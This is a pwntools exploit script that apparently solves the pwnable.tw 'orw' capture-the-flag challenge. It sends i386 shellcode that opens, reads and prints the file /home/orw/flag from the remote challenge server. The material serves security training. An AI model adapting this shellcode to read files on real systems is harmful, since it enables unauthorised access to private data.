#!/usr/bin/python
# coding=utf-8

from pwn import *
from binascii import unhexlify

context.clear()
context.update(arch='i386', os='linux', endian='little', word_size=32)
context.log_level = 'debug'
log.info(vars(context))

from pwn import *

#p = process('./orw')
p = remote('chall.pwnable.tw', 10001)

shellcode = asm("""
    mov eax, 5
    push 0x00006761
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80

    mov ebx, eax
    mov eax, 3
    mov ecx, 0x804a060 + 200 - 64
    mov edx, 64
    int 0x80

    mov eax, 4
    mov ebx, 1
    mov ecx, 0x804a060 + 200 - 64
    mov edx, 64
    int 0x80
    """)

p.send(shellcode)

log.info(p.recv(4096))
